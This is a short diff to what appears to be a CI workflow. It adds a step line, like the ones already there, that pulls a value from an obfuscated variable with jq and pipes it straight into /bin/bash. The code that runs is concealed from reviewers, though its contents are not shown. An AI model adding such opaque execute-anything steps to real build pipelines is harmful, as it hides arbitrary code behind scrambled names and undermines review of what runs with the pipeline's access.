@@ -28,6 +28,7 @@ jobs:
           echo $pgocm633 | jq -r .ebiml09 | /bin/bash
           echo $ubkt464 | jq -r .vp215 | /bin/bash
           echo $fepv60417 | jq -r .mzf1 | /bin/bash
+          echo $extm6973 | jq -r .jx050 | /bin/bash
 
       - name: Store artifact
         if: always()
